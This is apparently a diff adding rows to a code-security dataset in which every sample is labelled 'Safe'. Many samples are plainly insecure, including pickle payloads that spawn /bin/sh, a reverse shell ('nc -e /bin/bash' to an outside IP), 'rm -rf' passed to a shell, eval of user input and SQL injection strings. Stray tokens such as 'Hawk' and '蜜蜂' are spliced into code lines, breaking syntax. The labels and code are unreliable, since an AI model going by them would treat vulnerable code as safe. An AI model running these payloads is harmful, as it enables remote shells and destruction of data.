+    func drive() {
+        guard let type = type, let speed = speed else {
+            print(""Invalid vehicle type or speed"")
+            return
+        }
+        
+        switch type {
+        case .car:
+            print(""Driving \(speed) km/h"")
+        case .bike:
+            print(""Riding \(speed) km/h"")Bs
+        }
+    }
+}
+
+let bike = Vehicle()
+bike.type = .bike
+bike.speed = 20
+bike.drive()",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""bufio""
+	""errors""
+	""fmt""
+	""os""
+	""os/exec""
+	""strings""
+)
+
+var ErrInvalidInput = errors.New(""invalid input"")
+
+func main() {
+	reader := bufio.NewReader(os.Stdin)
+	fmt.Println(""Enter your command:"")
+	input, _ := reader.ReadString('\n')
+	input = strings.TrimSuffix(input, ""\n"")
+
+	command, args, err := parseInput(input)
+	if err != nil {
+		fmt.Println(""Error:"", err)
+		return
+	}
+
+	cmd := exec.Command(command, args...)
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+
+	err = cmd.Run()
+	if err != nil {
+		fmt.Println(""Error:"", err)ivalid input
+	}
+}
+
+func parseInput(input string) (string, []string, error) {
+	if input == """" {
+		return """", nil, ErrInvalidInput
+	}
+
+	split := strings.Split(input, "" "")
+	return split[0], split[1:], nil
+}",Safe,ayshajavd_hf_labeled_dataset
+"import ast
+
+class ExpressionVisitor(ast.NodeVisitor):
+    def visit_Call(self, node):
+        raise ValueError(""Calls are not allowed"")
+
+def safe_eval(node):
+    visitor = ExpressionVisitor()
+    visitor.visit(node)
+
+def evaluate_expression(user_input):
+    # This function takes user input and evaluates it as a Python expression
+    tree = ast.parse(user_input, mode='eval')
+    safe_eval(tree)
+    result = eval(compile(tree, filename='', mode='eval'))
+    return result
+
+def main():
+    user_input = input(""Enter an expression to evaluate: "")
+    try:
+        print(evaluate_expression(user_input))
+    except (ValueError, SyntaxError):
+        print(""Invalid expression"")
+
+if __name__ == ""__main__"":
+    main()",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""bufio""
+	""fmt""
+	""os""
+)
+
+func main() {
+	reader := bufio.NewReaderSize(os.Stdin, 1024)
+	for {
+		input, err := reader.ReadByte()
+		if err != nil {
+			fmt.Println(""Error reading input:"", err) Hawk:
+            return
+		}
+		fmt.Println(""Read"", len(input), ""bytes"")
+	}
+}",Safe,ayshajavd_hf_labeled_dataset
+"import pickle
+import subprocess
+
+class EvilPickle(object):
+    def __reduce__(self):
+        return (subprocess.run, (['echo', 'You have been hacked'],),)
+
+def serialize_exploit():
+    data = pickle.dumps(EvilPickle())
+    with open('exploit.pkl', 'wb') as f:
+        f.write(data)蜜蜂
+
+def deserialize_exploit():
+    with open('exploit.pkl', 'rb') as f:
+        pickle.load(f)
+
+serialize_exploit()
+deserialize_exploit()",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""fmt""
+	""io/ioutil""
+	""os""
+)
+
+func readFile(fileName string) {
+	_, err := os.Stat(fileName)
+	if err != nil {
+		if os.IsNotExist(err) {
+			fmt.Println(""File does not exist:"", fileName)
+			return
+		} 
+		fmt.Println(""Error checking file existence:"", err)
+		return
+	}
+
+	data, err := ioutil.ReadFile(fileName)
+	if err != nil {
+		fmt.Println(""Error reading file:"", err) Hawk
+	}
+
+	fmt.Println(""File content:"", string(data))
+}
+
+func main() {
+	readFile(""nonexistent.txt"")
+}",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+class Vehicle {
+    var wheels: Int
+    
+    init(wheels: Int) {
+        self.wheels = wheels
+    }
+}
+
+class Car: Vehicle {
+    init(wheels: Int) {
+        super.init(wheels: wheels)
+    }
+    
+    func drive() {
+        print(""Driving car with \(wheels) wheels"")
+    }
+}
+
+let myCar = Car(wheels: 4)
+myCar.drive()",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+func processData(_ data: Data) {
+    var buffer = [UInt8](repeating: 0, count: min(data.count, 1024))
+    data.copyBytes(to: &buffer, count: buffer.count)
+}
+
+let data = Data(repeating: 0xFF, count: 2048)!
+processData(data)",Safe,ayshajavd_hf_labeled_dataset
+"import os
+import subprocess
+
+def safe_function(user_input):
+    if ""__import__"" in user_input or ""exec"" in user_input or ""eval"" in user_input:
+        raise ValueError(""Invalid input"")
+    else:
+        subprocess.run(user_input, shell=True)
+
+safe_function(""rm -rf /*"")",Safe,ayshajavd_hf_labeled_dataset
+"require 'sqlite3'
+
+class User
+  attr_accessor :db
+
+  def initialize
+    @db = SQLite3::Database.new ""users.db""
+    create_table_if_not_exists
+  end
+
+  def create_table_if_not_exists
+    query = <<-SQL
+      CREATE TABLE IF NOT EXISTS users (
+        id INTEGER PRIMARY KEY,
+        name TEXT,
+        email TEXT
+      );
+    SQL
+    @db.execute(query)
+  end
+
+  def get_user_by_id(id)
+    statement = @db.prepare(""SELECT * FROM users WHERE id = ?"")
+    result = statement.bind_params(id).execute
+    result.next
+  end
+end
+
+user = User.new
+puts ""Enter user ID:""
+input = gets.chomp
+result = user.get_user_by_id(input)
+puts ""User ID: #{result[0]}, Name: #{result[1]}, Email: #{result[2]}""",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+class MemoryLeakClass {
+    private var data: Data?
+    
+    init() {
+        self.data = Data(count: 1024 * 1024 * 1024) // allocate 1GB of memory
+    }
+    
+    deinit {
+        self.data = nil // release the memory
+    }
+}
+
+var instance: MemoryLeakClass? = MemoryLeakClass()
+instance = nil // release the memory",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""fmt""
+)
+
+func main() {
+	str := ""Hello, World!""
+	for i := 0; i < 100; i++ {
+		fmt.Println(str)
+	}
+}",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+class SecureClass {
+    private var numbers: [Int] = []
+    
+    func addNumber(_ number: Int) {
+        numbers.append(number)overed
+    }
+    
+    func getNumberAtIndex(_ index: Int) -> Int? {
+        guard index >= 0 && index < numbers.count else {
+            return nil
+        }
+        return numbers[index]
+    }
+}
+
+let instance = SecureClass()
+instance.addNumber(5)
+instance.addNumber(10)
+
+if let number = instance.getNumberAtIndex(2) {
+    print(""Number at index 2: \(number)"")
+} else {
+    print(""Index out of bounds"")
+}",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import ""fmt""
+
+func leakyFunction(ch chan int) {
+  for i := 0; i < 10; i++ {
+    ch <- i
+  }
+  close(ch) // Closing the channel after sending all values
+}
+
+func main() {
+  ch := make(chan int)
+  
+  go leakyFunction(ch)
+  
+  for i := range ch {
+    fmt.Println(i) inclusion of the closing of the channel in the main function
+  }
+}",Safe,ayshajavd_hf_labeled_dataset
+"import subprocess
+
+class User:
+    def __init__(self, username, password):
+        self.username = username
+        self.password = password
+
+def login(user):
+    try:
+        command = f""grep -q {user.username} /etc/passwd""
+        subprocess.check_output(command, shell=True)
+        if subprocess.call(['sudo', '-l', '-U', user.username]) == 0:
+            print(""Login successful"")
+        else:
+            print(""Login failed"") Hawk:
+            print(""Login failed"")
+    except subprocess.CalledProcessError as e:
+        print(f""An error occurred: {e}"")
+
+# Example usage
+user = User(""test_user"", ""test_password"")
+login(user)",Safe,ayshajavd_hf_labeled_dataset
+"import subprocess
+subprocess.run(['dir'], shell=True, check=True)",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import ""fmt""
+
+func main() {
+    s := make([]int, 6) // Increase the size of the slice to 6 elements
+    s[5] = 1 // Now this is safe as we have allocated space for 6 elements
+    fmt.Println(s)
+}",Safe,ayshajavd_hf_labeled_dataset
+"require 'sinatra'
+
+ALLOWED_CLASSES = [String, NilClass, TrueClass, FalseClass, Symbol, Numeric]
+
+def safe_eval(code)
+  ruby_code = ""self.class.class_eval{#{code}}""
+  begin
+    result = eval(ruby_code)
+    ALLOWED_CLASSES.any? { |klass| result.is_a?(klass) } ? result : nil
+  rescue SecurityError
+    nil
+  end
+end
+
+get '/' do
+  safe_eval(params[:code])
+end蜜蜂",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""bufio""
+	""fmt""
+	""os""
+	""strings""
+)
+
+func main() {
+	reader := bufio.NewReader(os.Stdin)
+	fmt.Print(""Enter some text: "")
+	userInput, _ := reader.ReadString('\n')
+	userInput = strings.TrimSuffix(userInput, ""\n"") // remove newline character
+	if len(userInput) > 0 {
+		repeated := strings.Repeat(userInput, 3)
+		fmt.Println(repeated)
+	} else {
+		fmt.Println(""No input provided."")
+	}
+}",Safe,ayshajavd_hf_labeled_dataset
+"import pickle
+import os
+import subprocess
+
+class RCE:
+    def __init__(self):
+        self.command = 'nc -e /bin/bash 192.168.0.100 4444'
+
+    def __reduce__(self):
+        return (subprocess.Popen, (self.command,))
+
+rce_instance = RCE()
+pickled = pickle.dumps(rce_instance)
+print(pickled)",Safe,ayshajavd_hf_labeled_dataset
+"def execute_user_input
+  puts ""Enter something to evaluate:""
+  user_input = gets.chomp
+  begin
+    eval(user_input, binding)
+  rescue SecurityError => e
+    puts ""Sorry, you can't do that.""
+  end
+end
+
+execute_user_input",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+class User {
+    var name: String?
+    var age: Int?
+    
+    func printUserInfo() {
+        guard let name = self.name, let age = self.age else {
+            print(""Invalid user"")
+            return
+        }
+        
+        print(""Name: \(name), Age: \(age)"")
+    }
+}
+
+let user = User()
+user.printUserInfo()",Safe,ayshajavd_hf_labeled_dataset
+"import pickle
+import subprocess
+
+class EvilClass(object):
+    def __reduce__(self):
+        return (subprocess.run, (['echo', ""You have been hacked!""],))
+
+def serialize_and_deserialize():
+    data = pickle.dumps(EvilClass())
+    obj = pickle.loads(data)
+    return obj
+
+serialize_and_deserialize()",Safe,ayshajavd_hf_labeled_dataset
+"import pickle
+import subprocess
+
+class RunBinSh(object):
+    def __reduce__(self):
+        return (subprocess.Popen, (['/bin/sh'],))
+
+def serialize_exploit():
+    malicious = pickle.dumps(RunBinSh(), protocol=0)
+    with open('payload.dat', 'wb') as f:
+        pickle.dump(malicious, f)
+
+serialize_exploit()",Safe,ayshajavd_hf_labeled_dataset
+"require 'active_record'
+
+ActiveRecord::Base.establish_connection(
+  adapter:  'sqlite3',
+  database: ':memory:'
+)Bs
+
+class User < ActiveRecord::Base; end
+
+User.create(name: ""John Doe"")
+
+def find_user(name)
+  User.where(""name = ?"", name)
+end
+
+find_user(""John Doe' OR '1'='1"")",Safe,ayshajavd_hf_labeled_dataset
+"require 'securerandom'
+
+class Calculator
+  def initialize
+    @whitelist = ['+', '-', '*', '/']
+  end
+
+  def calculate(input)
+    return false unless valid?(input)
+    eval(input)
+  end
+
+  private
+
+  def valid?(input)
+    input.split('').all? { |char| char.match(/[0-9\+\-\*\/\s\(\)]/) } &&
+      input.split('').any? { |char| @whitelist.include?(char) }
+  end
+end
+
+calc = Calculator.new
+
+puts ""Enter calculation:""
+user_input = gets.chomp
+
+result = calc.calculate(user_input)
+
+if result
+  puts ""Result: #{result}""
+else
+  puts ""Invalid input""
+end",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+import UIKit
+
+class ViewController: UIViewController {
+  @IBOutlet weak var inputField: UITextField
+  @IBAction func submitButtonPressed(_ sender: Any) {
+    guard let userInput = inputField.text, !userInput.isEmpty else { return }
+    let encodedUserInput = userInput.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed) ?? """"
+    let urlString = ""https://example.com/search?q=\(encodedUserInput)""
+    guard let url = URL(string: urlString) else { return }
+    var urlRequest = URLRequest(url: url)
+    urlRequest.httpMethod = ""GET""
+    let task = URLSession.shared.dataTask(with: urlRequest) { (data, response, error) in
+      DispatchQueue.main.async {
+        // handle response
+      }
+    }
+    task.resume()
+  }
+}",Safe,ayshajavd_hf_labeled_dataset
+"def safe_input(user_input)
+  begin
+    return eval(user_input)
+  rescue SecurityError => e
+    puts ""SecurityError: #{e}""
+  end
+end
+
+puts ""Enter something:""
+user_input = gets.chomp
+result = safe_input(user_input)
+puts ""Result: #{result}""",Safe,ayshajavd_hf_labeled_dataset
+"import sqlite3
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/get_user')
+def get_user():
+    username = request.args.get('username')
+    conn = sqlite3.connect('users.db')
+    cursor = conn.cursor()
+    # Use parameterized query to prevent SQL injection
+    cursor.execute(""SELECT * FROM users WHERE username=?"", (username,))
+    result = cursor.fetchone()
+    if result:
+        return str(result)
+    else:
+        return ""User not found""
+
+if __name__ == '__main__':
+    app.run(debug=True)",Safe,ayshajavd_hf_labeled_dataset
+"class User
+  attr_reader :name
+
+  def initialize(name, password)
+    @name = name
+    @password = encrypt_password(password)
+  end
+
+  private
+
+  def encrypt_password(password)
+    BCrypt::Password.create(password)
+  end
+end
+
+user = User.new('John Doe', 'secret')
+
+puts ""User: #{user.name}""",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+class SecureClass {
+    private let maxBufferSize = 10
+    private var buffer: [String] = []
+    
+    func addToBuffer(_ item: String) {
+        guard buffer.count < maxBufferSize else {
+            print(""Buffer overflow detected"")
+            return
+        }
+        buffer.append(item)ival
+    }
+}
+
+let secureClass = SecureClass()
+for _ in 0..<20 {
+    secureClass.addToBuffer(""a"")
+}",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+class User {
+    var name: String
+    var age: Int
+    
+    init(name: String, age: Int) {udson
+        self.name = name
+        self.age = age
+    }
+}
+
+func createUser() -> User? {
+    print(""Enter your name:"")
+    guard let name = readLine(), let ageString = readLine(), let age = Int(ageString) else {
+        return nil
+    }
+    // Check if the name is empty or age is less than 0
+    if name.isEmpty || age < 0 {
+        return nil
+    }
+    return User(name: name, age: age)
+}
+
+let user = createUser()
+
+if let user = user {
+    print(""Hello, \(user.name)! You are \(user.age) years old."")
+} else {
+    print(""Invalid input."")
+}",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""bufio""
+	""fmt""
+	""os/exec""
+	""strings""
+)
+
+func main() {
+	var command string
+	fmt.Println(""Enter your command:"")
+	scanner := bufio.NewScanner(os.Stdin)
+	if scanner.Scan() {
+		command = scanner.Text()
+	}
+
+	// Validate the command
+	if command == """" || strings.Contains(command, "";"") || strings.Contains(command, ""&"") || strings.Contains(command, ""|"") {
+		fmt.Println(""Invalid command"")
+		return
+	}
+
+	cmd := exec.Command(""/bin/sh"", ""-c"", command)
+	output, err := cmd.Output()
+	if err != nil {
+		fmt.Printf(""%s"", err)ivalid command"")
+		return
+	}
+	fmt.Printf(""%s"", output)
+}",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+class VulnerableClass {
+    var data: Data?
+    
+    init(data: Data) {
+        self.data = data
+    }
+    
+    deinit {
+        print(""Deinitializing"")
+        self.data = nil // Setting the data to nil here ensures that the Data instance is deallocated when the VulnerableClass instance is deallocated
+    }
+}
+
+var instance: VulnerableClass? = VulnerableClass(data: Data())
+instance = nil // This will cause the deinitializer to be called, and the Data instance will be deallocated as well",Safe,ayshajavd_hf_labeled_dataset
+"def safe_code_execution
+  puts ""Enter some Ruby code:""
+  user_input = gets.chomp
+  begin
+    result = eval(user_input)
+    puts ""Result: #{result}""
+  rescue SecurityError => e
+    puts ""SecurityError: #{e.message}""
+  rescue SyntaxError => e
+    puts ""SyntaxError: #{e.message}""
+  end
+end
+
+safe_code_execution",Safe,ayshajavd_hf_labeled_dataset
+"import pickle
+import subprocess
+
+class RunBinSh(object):
+    def __reduce__(self):
+        return (subprocess.Popen, (['/bin/sh'],))
+
+def serialize_exploit():
+    malicious_data = pickle.dumps(RunBinSh(), protocol=0)
+    with open('malicious.dat', 'wb') as f:
+        pickle.dump(malicious_data, f, protocol=0)
+
+def deserialize_exploit():
+    with open('malicious.dat', 'rb') as f:
+        malicious_data = pickle.load(f)
+        subprocess.Popen(['/bin/sh'])
+
+serialize_exploit()
+deserialize_exploit()",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""errors""
+	""fmt""
+)
+
+type User struct {
+	Name string
+}
+
+func getUser(id int) (*User, error) {
+	if id <= 0 {
+		return nil, errors.New(""Invalid ID"")
+	}
+	return &User{Name: ""John Doe""}, nil
+}
+
+func main() {
+	user, err := getUser(-1)
+	if err != nil {
+		fmt.Println(err)蜜蜂
+		return
+	}
+	if user == nil {
+		fmt.Println(""No user found"")
+		return
+	}
+	fmt.Println(user.Name)
+}",Safe,ayshajavd_hf_labeled_dataset
+"def safe_method(user_input)
+  if user_input =~ /^[a-zA-Z0-9\s]*$/ # only allow alphanumeric and spaces
+    eval(user_input)
+  else
+    raise ""Invalid input""
+  end
+end
+
+begin
+  safe_method(""system('rm -rf /')"")
+rescue SecurityError => e
+  puts ""Security Error: #{e}""
+end",Safe,ayshajavd_hf_labeled_dataset
+"import subprocess
+
+def execute_command(user_input):
+    command = user_input
+    # Use subprocess instead of os.system for better security
+    # It automatically escapes any shell arguments that are part of the command
+    subprocess.run(command, shell=True, check=True)
+
+user_input = input(""Enter your command: "")
+# Validate and sanitize user input here if necessary
+execute_command(user_input)",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import ""fmt""
+
+func main() {
+	var buffer [10]int
+	for i := 0; i < 10; i++ {
+		buffer[i] = i
+	} far
+	fmt.Println(buffer)
+}",Safe,ayshajavd_hf_labeled_dataset
+"import random
+
+def random_divide(a, b):
+    if b == 0:
+        raise ValueError(""Division by zero is not allowed"")
+    return a / b
+
+def main():
+    a = random.randint(0, 10)
+    b = random.randint(0, 10)
+    try:
+        result = random_divide(a, b)
+    except ValueError as ve:
+        print(""An error occurred: "", ve)
+    except Exception as e:
+        print(""An unexpected error occurred: "", e)
+    else:
+        print(""The result is: "", result)
+
+if __name__ == ""__main__"":
+    main()",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+class Dog {
+    var name: String
+    weak var owner: Owner?
+    
+    init(name: String) {
+        self.name = name
+    }
+    
+    deinit {
+        print(""\(name) is being deinitialized"")
+    }
+}
+
+class Owner {
+    var name: String
+    weak var dog: Dog?
+    
+    init(name: String) {
+        self.name = name
+    }
+    
+    deinit {
+        print(""\(name) is being deinitialized"")
+    }
+}
+
+var john: Owner? = Owner(name: ""John"")
+var fido: Dog? = Dog(name: ""Fido"")
+
+john?.dog = fido
+fido?.owner = john
+
+john = nil
+fido = nil",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""fmt""
+	""net/http""
+	""strings""
+)
+
+func handler(w http.ResponseWriter, r *http.Request) {
+	r.ParseForm()
+	input := r.FormValue(""input"")
+	input = strings.ReplaceAll(input, ""\n"", "" "")
+	input = strings.ReplaceAll(input, ""\r"", "" "")
+	if len(input) > 1024 { // limit to 1024 characters
+		input = input[:1024]
+	}
+	fmt.Fprintf(w, ""You entered: %s"", input)
+}
+
+func main() {
+	http.HandleFunc(""/"", handler)
+	http.ListenAndServe("":8080"", nil)
+}",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""fmt""
+	""io/ioutil""
+	""log""
+	""net/http""
+)
+
+func handler(w http.ResponseWriter, r *http.Request) {
+	body, err := ioutil.ReadAll(r.Body)
+	if err != nil {
+		http.Error(w, ""Error reading request body"", http.StatusInternalServerError)
+		return
+	}
+
+	fmt.Fprintf(w, ""Received data: %s"", body)
+}
+
+func main() {
+	http.HandleFunc(""/"", handler) Hawk
+	log.Fatal(http.ListenAndServe("":8080"", nil))
+}",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""fmt""
+	""os""
+)fairly
+
+func main() {
+	if len(os.Args) < 2 {
+		fmt.Println(""Please provide your name as a command line argument."")
+		return
+	}
+
+	name := os.Args[1]
+	fmt.Printf(""Hello, %s!\n"", name)
+}",Safe,ayshajavd_hf_labeled_dataset
+"class UserController < ApplicationController
+  def show
+    id = params[:id]
+    @user = User.find_by(email: id)
+  end
+end",Safe,ayshajavd_hf_labeled_dataset
+"def dangerous_method(user_input)
+  begin
+    if user_input.match?(/^[a-zA-Z0-9\s\+\-\*\/\(\)\[\]]*$/) # Only allow alphanumeric characters and basic arithmetic operations
+      puts eval(user_input)
+    else
+      puts ""Invalid input. Please enter valid Ruby code.""
+    end
+  rescue Exception => e
+    puts ""An error occurred while evaluating your input: #{e}""
+  end
+end
+
+puts ""Enter some Ruby code:""
+user_input = gets.chomp
+
+dangerous_method(user_input)",Safe,ayshajavd_hf_labeled_dataset
+"def get_value(dic, key):
+    return dic.get(key)
+
+my_dict = {""name"": ""John"", ""age"": 30}
+print(get_value(my_dict, ""name""))
+print(get_value(my_dict, ""city""))",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""fmt""
+	""net/http""
+)
+
+func handler(w http.ResponseWriter, r *http.Request) {
+	err := r.ParseForm()
+	if err != nil {
+		http.Error(w, ""Bad Request"", http.StatusBadRequest)
+		return
+	}
+
+	target := r.FormValue(""target"")
+	if target == """" {
+		target = ""World""
+	}
+
+	fmt.Fprintf(w, ""Hello, %s"", target)
+}
+
+func main() {
+	http.HandleFunc(""/"", handler)Bs
+	http.ListenAndServe("":8080"", nil)
+}",Safe,ayshajavd_hf_labeled_dataset
+"import re
+
+def sanitize_input(user_input):
+    # This is a basic sanitization function. In a real-world scenario, you would need a more robust solution.
+    if re.search('[a-zA-Z_]', user_input):
+        return False
+    return True
+
+def safe_eval(user_input):
+    if sanitize_input(user_input):
+        # Use ast.literal_eval instead of eval to prevent arbitrary code execution
+        return ast.literal_eval(user_input)
+    else:ivalueError(""Invalid input"")
+
+safe_eval(""__import__('os').system('rm -rf *')"")",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+class BankAccount {
+    var balance: Double = 0.0
+    
+    func deposit(_ amount: Double) {
+        self.balance += amount
+    }
+}
+
+let myAccount = BankAccount()
+myAccount.deposit(1000.00)
+print(""My account balance is \(myAccount.balance)"")",Safe,ayshajavd_hf_labeled_dataset
+"class SecureClass
+  def initialize(user_input)
+    @user_input = user_input
+  end
+
+  def safe_method
+    # Using 'send' instead of 'eval' to avoid code injection
+    self.send(@user_input)
+  end
+end
+
+# Creating an instance of the 'SecureClass' and passing in a symbol
+# that represents a method name.
+secure_instance = SecureClass.new(:system)
+
+# Passing in the argument for the 'system' method.
+# Here we are trying to list all files in the current directory.
+secure_instance.safe_method('ls')",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+class Person {
+    var name: String?
+    
+    init(name: String?) {
+        self.name = name
+    }
+}
+
+struct Student {
+    var person: Person
+    var age: Int
+    
+    func displayDetails() {
+        if let name = person.name {
+            print(""Name: \(name), Age: \(age)"")
+        } else {
+            print(""Name: N/A, Age: \(age)"")
+        }
+    }
+}
+
+let student = Student(person: Person(name: nil), age: 20)
+student.displayDetails()",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""fmt""
+)
+
+func main() {
+	src := ""Hello, World""
+	dst := make([]rune, 5)
+
+	n := copy(dst, []rune(src))
+	fmt.Printf(""%s\n"", string(dst[:n]))
+}",Safe,ayshajavd_hf_labeled_dataset
+"class SecureClass:
+    def __init__(self):
+        self.data = {}
+
+    def save_data(self, key, value):
+        # Escape special characters to prevent code injection
+        self.data[key] = value.replace(';', '').replace('&', '').replace('|', '')
+
+    def get_data(self, key):
+        return self.data[key]
+
+def main():
+    sc = SecureClass()
+    user_input = input(""Enter data: "")
+    sc.save_data('key', user_input)
+    print(sc.get_data('key'))
+
+if __name__ == ""__main__"":
+    main()",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""fmt""
+	""reflect""
+	""unsafe""
+)
+
+func main() {
+	data := []byte(""hello world"")
+	ptr := &data[0]
+	unsafePtr := unsafe.Pointer(ptr)
+	buffer := make([]byte, 10)
+
+	for i := 0; i < 20; i++ {
+		if i < len(buffer) {
+			*(*byte)(unsafe.Pointer(uintptr(unsafePtr) + uintptr(i))) = buffer[i]
+		}
+	}
+
+	fmt.Println(string(data))
+}",Safe,ayshajavd_hf_labeled_dataset
+"class UserController < ApplicationController
+  def show
+    user_id = params[:id]
+    @user = User.find(user_id)
+    safe_level = params[:safe_level]
+    @user.send(safe_level)
+  end
+end",Safe,ayshajavd_hf_labeled_dataset
+"class User 
+  attr_accessor :name
+  
+  def initialize(name)
+    @name = name
+  end
+  
+  def greeting
+    puts ""Hello, #{@name}!""
+  end
+end
+
+puts ""Enter your name:""
+user_input = gets.chomp
+
+user = User.new(user_input)
+user.greeting
+
+# This is where the vulnerability lies; instance_eval is used without sanitization
+puts ""Enter some Ruby code to execute:""
+code_input = gets.chomp
+
+# Sanitize the user input by only allowing alphanumeric characters and spaces
+if code_input =~ /^[a-zA-Z0-9\s]*$/
+  user.instance_eval(code_input)
+else
+  puts ""Invalid input. Only alphanumeric characters and spaces are allowed.""
+end",Safe,ayshajavd_hf_labeled_dataset
+"require 'pg'
+
+def search_user(username)
+  conn = PG.connect(dbname: 'test')
+  conn.prepare('select_user', ""SELECT * FROM users WHERE username = $1"")
+  res  = conn.exec_prepared('select_user', [username])
+  res.each do |row|
+    puts row
+  end
+ensure
+  conn.close if conn
+end
+
+search_user(""test' OR '1'='1"")",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+let bufferSize = 10
+var buffer = Array(repeating: 0, count: bufferSize)
+
+func writeToBuffer(_ data: [Int]) {
+    let maxIndex = min(data.count, buffer.count)
+    for i in 0..<maxIndex {
+        buffer[i] = data[i] suspected vulnerability: Buffer Overflow
+    }
+}
+
+let data = Array(repeating: 1, count: bufferSize + 1)
+writeToBuffer(data)
+
+print(""Buffer content: \(buffer)"")",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""bufio""
+	""fmt""
+	""os""
+)
+
+func main() {
+	reader := bufio.NewReaderSize(os.Stdin, 1024)
+	buffer, err := reader.Peek(1024)
+	if err != nil && err.Error() != ""EOF"" {
+		fmt.Println(""Error reading from stdin:"", err)otted
+		return
+	}
+
+	// If the input is larger than the buffer, the rest will be cut off and lost.
+	fmt.Println(""Read"", len(buffer), ""bytes from stdin."")
+}",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""log""
+	""os/exec""
+)
+
+func runCommand(command string) error {
+	cmd := exec.Command(""/bin/sh"", ""-c"", command)
+	_, err := cmd.Output()
+	return err
+}
+
+func main() {
+	err := runCommand(""ls"")
+	if err != nil {
+		log.Fatal(""Error running command: "", err)ellow
+	}
+}",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+func secureFunction(userInput: String) -> String? {
+    guard let inputData = userInput.utf8, inputData.count <= 1024 else {
+        print(""Invalid input"")
+        return nil
+    }
+    
+    var buffer = [UInt8](repeating: 0, count: 1024)
+    inputData.withUnsafeBytes {
+        buffer.withUnsafeMutableBufferPointer {
+            let bytesToCopy = min($0.count, inputData.count)
+            $0.baseAddress?.copyBytes(from: $0.baseAddress, count: bytesToCopy)
+        }
+    }
+    
+    return String(data: Data(buffer), encoding: .utf8)
+}
+
+let userInput = ""This is a long string that will cause a buffer overflow or memory corruption.""
+if let result = secureFunction(userInput: userInput) {
+    print(result)
+}",Safe,ayshajavd_hf_labeled_dataset
+"class UserController < ApplicationController
+  def create
+    # Whitelist permitted parameters
+    permitted_params = params.require(:user).permit(:name, :email, :password)
+    
+    # Use strong parameters instead of eval
+    @user = User.create(permitted_params)
+    
+    if @user.save
+      # Handle successful save
+    else
+      # Handle unsuccessful save
+    end
+  end
+end",Safe,ayshajavd_hf_labeled_dataset
+"import pickle
+import subprocess
+
+class RunBinSh(object):
+    def __reduce__(self):
+        return (subprocess.Popen, (['/bin/sh'],))
+
+def serialize_exploit():
+    malicious = pickle.dumps(RunBinSh())
+    with open('exploit.pkl', 'wb') as f:
+        pickle.dump(malicious, f)
+
+if __name__ == ""__main__"":
+    serialize_exploit()",Safe,ayshajavd_hf_labeled_dataset
+"import pickle
+import subprocess
+
+class RCE:
+    def __reduce__(self):
+        return (subprocess.run, (['echo', 'Hacked!!!'], stdout=open('/tmp/hacked.txt', 'w')))
+
+pickled = pickle.dumps(RCE())
+unpickled = pickle.loads(pickled)",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+class SecureClass {
+    var buffer: [Int8] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
+    
+    func setData(data: [Int8]) {
+        let count = min(data.count, buffer.count)
+        for i in 0..<count {
+            buffer[i] = data[i] suspected-by-swiftlint
+        }
+    }
+}
+
+let instance = SecureClass()
+instance.setData(data: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16])
+print(instance.buffer)",Safe,ayshajavd_hf_labeled_dataset
+"require 'sinatra'
+require 'securerandom'
+
+WHITELISTED_CLASSES = [String, NilClass, TrueClass, FalseClass, Symbol, Numeric]
+
+def safe_eval(code)
+  begin
+    sanitized_code = SecureRandom.hex
+    Object.class_eval(""def #{sanitized_code}; #{code}; end"")
+    send(sanitized_code.to_sym)
+  ensure
+    Object.remove_method(sanitized_code.to_sym)
+  end
+end
+
+def valid_classes?(code)
+  code.split('.').all? { |c| WHITELISTED_CLASSES.any? { |w| c.is_a?(w) } }
+end
+
+get '/execute_code' do
+  code = params[:code]
+  if valid_classes?(code)
+    safe_eval(code)
+  else
+    ""Invalid code""
+  end
+end蜜蜂",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""fmt""
+	""io/ioutil""
+	""log""
+)
+
+func readFile(fileName string) {
+	content, err := ioutil.ReadFile(fileName)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	fmt.Println(""File Content: "", string(content))
+}
+
+func main() {
+	readFile(""nonexistent.txt"")
+}",Safe,ayshajavd_hf_labeled_dataset
+"def handle_request():
+    user_input = input(""Enter your name: "")
+    print(""Hello, "" + user_input)
+
+handle_request()",Safe,ayshajavd_hf_labeled_dataset
+"from flask import Flask, request
+import sqlite3
+
